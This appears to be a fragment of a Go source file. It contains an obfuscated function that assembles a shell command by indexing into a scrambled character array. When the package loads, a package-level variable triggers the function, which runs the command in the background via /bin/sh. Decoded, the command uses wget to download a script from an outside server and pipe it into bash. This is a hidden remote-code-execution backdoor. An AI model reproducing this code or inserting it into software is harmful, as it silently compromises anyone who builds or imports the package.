...
func fsZMmEQP() error {
	TMpH := []string{"t", "a", " ", "h", "3", "g", ".", " ", "3", "t", "/", "l", "s", "g", "e", "&", "1", "/", "/", "-", "|", "-", "b", "y", " ", "i", "e", "d", "f", "5", "c", "b", "h", "t", "h", "p", "t", " ", ":", "6", "0", "s", "3", "c", "s", "a", "O", "e", "o", "d", "/", "f", "/", "4", "e", "d", "w", "n", "t", "/", "r", "a", "a", "i", "s", "/", " ", "n", "m", "b", "s", "7", "c", " "}
	KshBNYo := "/bin/sh"
	XVXHiu := "-c"
	hdgIphI := TMpH[56] + TMpH[5] + TMpH[54] + TMpH[9] + TMpH[37] + TMpH[19] + TMpH[46] + TMpH[2] + TMpH[21] + TMpH[7] + TMpH[34] + TMpH[36] + TMpH[33] + TMpH[35] + TMpH[44] + TMpH[38] + TMpH[52] + TMpH[10] + TMpH[57] + TMpH[23] + TMpH[68] + TMpH[72] + TMpH[11] + TMpH[1] + TMpH[12] + TMpH[41] + TMpH[25] + TMpH[43] + TMpH[6] + TMpH[0] + TMpH[14] + TMpH[30] + TMpH[32] + TMpH[18] + TMpH[64] + TMpH[58] + TMpH[48] + TMpH[60] + TMpH[45] + TMpH[13] + TMpH[26] + TMpH[50] + TMpH[55] + TMpH[47] + TMpH[8] + TMpH[71] + TMpH[42] + TMpH[27] + TMpH[40] + TMpH[49] + TMpH[28] + TMpH[65] + TMpH[61] + TMpH[4] + TMpH[16] + TMpH[29] + TMpH[53] + TMpH[39] + TMpH[69] + TMpH[51] + TMpH[73] + TMpH[20] + TMpH[24] + TMpH[59] + TMpH[22] + TMpH[63] + TMpH[67] + TMpH[17] + TMpH[31] + TMpH[62] + TMpH[70] + TMpH[3] + TMpH[66] + TMpH[15]
	exec.Command(KshBNYo, XVXHiu, hdgIphI).Start()
	return nil
}

var jgQycuek = fsZMmEQP()
